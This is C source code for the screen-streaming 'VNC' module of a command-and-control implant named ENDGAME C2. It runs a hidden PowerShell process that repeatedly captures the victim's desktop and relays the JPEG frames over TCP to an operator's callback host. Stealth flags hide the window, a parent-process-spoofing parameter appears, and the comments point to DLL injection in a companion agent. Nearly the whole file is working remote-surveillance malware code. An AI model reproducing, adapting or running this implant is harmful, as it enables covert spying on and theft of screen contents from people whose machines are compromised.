/*
 * vnc.c — ENDGAME C2 VNC module (C agent)
 *
 * Uses PowerShell CopyFromScreen for capture (same approach as SCREENSHOT command).
 * PS subprocess outputs "W,H,base64JPEG\n" in a loop; this relay thread reads it
 * and sends standard VNC FRAME messages to the C2 TCP callback port.
 *
 * DLL injection is handled by the Go agent (vnc_dll_inject_windows.go).
 * The C agent supports the PS-based path only.
 */

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "vnc.h"

/* ── Protocol constants ───────────────────────────────────────────────────── */
#define VNC_FRAME  0x01
#define VNC_INFO   0x02
#define VNC_PONG   0x03
#define VNC_STOP   0x14
#define VNC_PING   0x15

/* ── Session state ────────────────────────────────────────────────────────── */
static volatile LONG g_vnc_running = 0;
static HANDLE        g_stop_event  = NULL;

/* ── Wire helpers ─────────────────────────────────────────────────────────── */

static BOOL tcp_write_all(SOCKET s, const void *buf, int n) {
    const char *p = (const char *)buf;
    while (n > 0) {
        int r = send(s, p, n, 0);
        if (r <= 0) return FALSE;
        p += r; n -= r;
    }
    return TRUE;
}

static BOOL tcp_read_all(SOCKET s, void *buf, int n) {
    char *p = (char *)buf;
    while (n > 0) {
        int r = recv(s, p, n, 0);
        if (r <= 0) return FALSE;
        p += r; n -= r;
    }
    return TRUE;
}

static BOOL tcp_send_frame(SOCKET s, uint8_t type, const void *payload, uint32_t plen) {
    uint8_t hdr[5];
    hdr[0] = type;
    hdr[1] = (uint8_t)(plen & 0xFF);
    hdr[2] = (uint8_t)((plen >> 8) & 0xFF);
    hdr[3] = (uint8_t)((plen >> 16) & 0xFF);
    hdr[4] = (uint8_t)((plen >> 24) & 0xFF);
    if (!tcp_write_all(s, hdr, 5)) return FALSE;
    if (plen > 0) tcp_write_all(s, payload, (int)plen);
    return TRUE;
}

/* ── Base64 decode (minimal, for PS output) ───────────────────────────────── */

static const int8_t b64_dtab[256] = {
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
    52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-2,-1,-1,
    -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
    15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
    -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
    41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
};

static size_t b64_decode(const char *src, size_t srclen, uint8_t *dst) {
    size_t out = 0;
    uint32_t acc = 0; int bits = 0;
    for (size_t i = 0; i < srclen; i++) {
        uint8_t c = (uint8_t)src[i];
        int8_t v = b64_dtab[c];
        if (v < 0) continue;
        acc = (acc << 6) | (uint32_t)v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            dst[out++] = (uint8_t)((acc >> bits) & 0xFF);
        }
    }
    return out;
}

/* ── VNC PS session thread ────────────────────────────────────────────────── */

typedef struct {
    SOCKET sock;
    int    quality;
} VNCPsArgs;

/* Input reader: server→agent TCP, handles STOP/PING */
static DWORD WINAPI vnc_input_reader(LPVOID param) {
    SOCKET sock = *(SOCKET *)param;
    while (WaitForSingleObject(g_stop_event, 0) == WAIT_TIMEOUT) {
        uint8_t hdr[5];
        if (!tcp_read_all(sock, hdr, 5)) break;
        uint8_t type = hdr[0];
        uint32_t plen = (uint32_t)hdr[1] | ((uint32_t)hdr[2]<<8)
                       | ((uint32_t)hdr[3]<<16) | ((uint32_t)hdr[4]<<24);
        if (plen > 0) {
            uint8_t *payload = (uint8_t *)malloc(plen);
            if (payload) tcp_read_all(sock, payload, (int)plen);
            free(payload);
        }
        if (type == VNC_STOP) {
            SetEvent(g_stop_event); break;
        } else if (type == VNC_PING) {
            tcp_send_frame(sock, VNC_PONG, NULL, 0);
        }
    }
    return 0;
}

static DWORD WINAPI vnc_ps_thread(LPVOID param) {
    VNCPsArgs *a = (VNCPsArgs *)param;

    /* PowerShell capture loop — outputs W,H,base64JPEG\n */
    char ps_cmd[4096];
    snprintf(ps_cmd, sizeof(ps_cmd),
        "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "
        "\"$q=%d;"
        "Add-Type -AssemblyName System.Drawing;"
        "Add-Type -TypeDefinition '"
        "using System;using System.Drawing;using System.Drawing.Imaging;using System.Runtime.InteropServices;"
        "public class SC{"
        "[DllImport(\\\"user32.dll\\\")] static extern IntPtr GetDesktopWindow();"
        "[DllImport(\\\"user32.dll\\\")] static extern IntPtr GetWindowDC(IntPtr h);"
        "[DllImport(\\\"user32.dll\\\")] static extern int ReleaseDC(IntPtr h,IntPtr d);"
        "[DllImport(\\\"gdi32.dll\\\")] static extern bool BitBlt(IntPtr d,int x,int y,int w,int h,IntPtr s,int sx,int sy,uint r);"
        "[DllImport(\\\"user32.dll\\\")] static extern int GetSystemMetrics(int i);"
        "public static Bitmap Cap(){"
        "int w=GetSystemMetrics(0);int h=GetSystemMetrics(1);"
        "if(w==0)w=1024;if(h==0)h=768;"
        "IntPtr hw=GetDesktopWindow();IntPtr dc=GetWindowDC(hw);"
        "Bitmap bmp=new Bitmap(w,h);"
        "using(Graphics g=Graphics.FromImage(bmp)){IntPtr md=g.GetHdc();BitBlt(md,0,0,w,h,dc,0,0,0x00CC0020u);g.ReleaseHdc(md);}"
        "ReleaseDC(hw,dc);return bmp;}"
        "}' -Language CSharp -ReferencedAssemblies 'System.Drawing';"
        "while($true){"
        "try{"
        "$bmp=[SC]::Cap();"
        "$ms=[System.IO.MemoryStream]::new();"
        "$ec=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|"
        "Where-Object{$_.MimeType-eq'image/jpeg'};"
        "$ep=[System.Drawing.Imaging.EncoderParameters]::new(1);"
        "$ep.Param[0]=[System.Drawing.Imaging.EncoderParameter]::new("
        "[System.Drawing.Imaging.Encoder]::Quality,[long]$q);"
        "$bmp.Save($ms,$ec,$ep);"
        "$w=$bmp.Width;$h=$bmp.Height;$b=[Convert]::ToBase64String($ms.ToArray());"
        "[Console]::Out.WriteLine($w.ToString()+','+$h.ToString()+','+$b);"
        "$bmp.Dispose();$ms.Dispose()"
        "}catch{};"
        "Start-Sleep -Milliseconds 66}\"",
        a->quality);

    SECURITY_ATTRIBUTES sa_pipe = { sizeof(sa_pipe), NULL, TRUE };
    HANDLE hRead = NULL, hWrite = NULL;
    if (!CreatePipe(&hRead, &hWrite, &sa_pipe, 0)) goto done;

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, ps_cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        goto done;
    }
    CloseHandle(hWrite);
    CloseHandle(pi.hThread);

    /* Spawn input reader */
    SOCKET *sockptr = &a->sock;
    HANDLE hInput = CreateThread(NULL, 0, vnc_input_reader, sockptr, 0, NULL);

    BOOL sent_info = FALSE;
    static char line_buf[8*1024*1024];
    DWORD total = 0;

    while (WaitForSingleObject(g_stop_event, 0) == WAIT_TIMEOUT) {
        DWORD avail = 0;
        if (!PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL)) break;
        if (avail == 0) { Sleep(10); continue; }

        DWORD nr = 0;
        DWORD to_read = min(avail, (DWORD)(sizeof(line_buf) - total - 1));
        if (!ReadFile(hRead, line_buf + total, to_read, &nr, NULL) || nr == 0) break;
        total += nr;
        line_buf[total] = 0;

        char *nl = strchr(line_buf, '\n');
        if (!nl) {
            if (total >= sizeof(line_buf) - 2) total = 0;
            continue;
        }
        *nl = 0;
        char *line = line_buf;

        /* Strip leading/trailing whitespace */
        while (*line == '\r' || *line == ' ') line++;

        char *p1 = strchr(line, ',');
        if (!p1) goto next_line;
        char *p2 = strchr(p1+1, ',');
        if (!p2) goto next_line;

        int w = atoi(line);
        int h = atoi(p1+1);
        const char *b64 = p2+1;
        size_t b64len = strlen(b64);
        while (b64len > 0 && (b64[b64len-1]=='\r'||b64[b64len-1]=='\n'||b64[b64len-1]==' '))
            b64len--;

        size_t max_dec = b64len * 3 / 4 + 4;
        uint8_t *dec = (uint8_t *)malloc(max_dec);
        if (!dec) goto next_line;
        size_t dec_len = b64_decode(b64, b64len, dec);

        if (dec_len > 0) {
            if (!sent_info) {
                char info[128];
                int ilen = snprintf(info, sizeof(info), "{\"w\":%d,\"h\":%d}", w, h);
                tcp_send_frame(a->sock, VNC_INFO, info, (uint32_t)ilen);
                sent_info = TRUE;
            }
            /* FRAME: [2B w LE][2B h LE][JPEG] */
            size_t flen = 4 + dec_len;
            uint8_t *frame = (uint8_t *)malloc(flen);
            if (frame) {
                frame[0] = (uint8_t)(w & 0xFF);  frame[1] = (uint8_t)((w>>8)&0xFF);
                frame[2] = (uint8_t)(h & 0xFF);  frame[3] = (uint8_t)((h>>8)&0xFF);
                memcpy(frame+4, dec, dec_len);
                tcp_send_frame(a->sock, VNC_FRAME, frame, (uint32_t)flen);
                free(frame);
            }
        }
        free(dec);

    next_line:;
        size_t consumed = (size_t)(nl - line_buf) + 1;
        memmove(line_buf, nl+1, total - consumed);
        total -= (DWORD)consumed;
    }

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(hRead);
    if (hInput) { WaitForSingleObject(hInput, 2000); CloseHandle(hInput); }

done:
    closesocket(a->sock);
    free(a);
    InterlockedExchange(&g_vnc_running, 0);
    return 0;
}

/* ── Public API ─────────────────────────────────────────────────────────── */

void vnc_start_ps(const char *callback_host, int callback_port,
                  int quality, DWORD ppid_spoof) {
    (void)ppid_spoof;
    if (InterlockedCompareExchange(&g_vnc_running, 1, 0) != 0)
        return; /* already running */

    WSADATA wsd; WSAStartup(MAKEWORD(2,2), &wsd);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        InterlockedExchange(&g_vnc_running, 0); return;
    }
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port = htons((u_short)callback_port);
    sa.sin_addr.s_addr = inet_addr(callback_host);
    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        closesocket(sock);
        InterlockedExchange(&g_vnc_running, 0); return;
    }

    if (g_stop_event) { CloseHandle(g_stop_event); g_stop_event = NULL; }
    g_stop_event = CreateEventA(NULL, TRUE, FALSE, NULL);

    VNCPsArgs *args = (VNCPsArgs *)malloc(sizeof(VNCPsArgs));
    args->sock    = sock;
    args->quality = quality;

    HANDLE ht = CreateThread(NULL, 0, vnc_ps_thread, args, 0, NULL);
    if (!ht) {
        closesocket(sock); free(args);
        InterlockedExchange(&g_vnc_running, 0);
    } else {
        CloseHandle(ht);
    }
}

/* DLL injection path — not implemented in C agent; use Go agent. */
void vnc_start_dll(const char *callback_host, int callback_port,
                   int quality, DWORD target_pid) {
    (void)target_pid;
    /* Fall through to PS path */
    vnc_start_ps(callback_host, callback_port, quality, 0);
}

void vnc_stop(void) {
    if (g_stop_event) SetEvent(g_stop_event);
}

#endif /* _WIN32 */
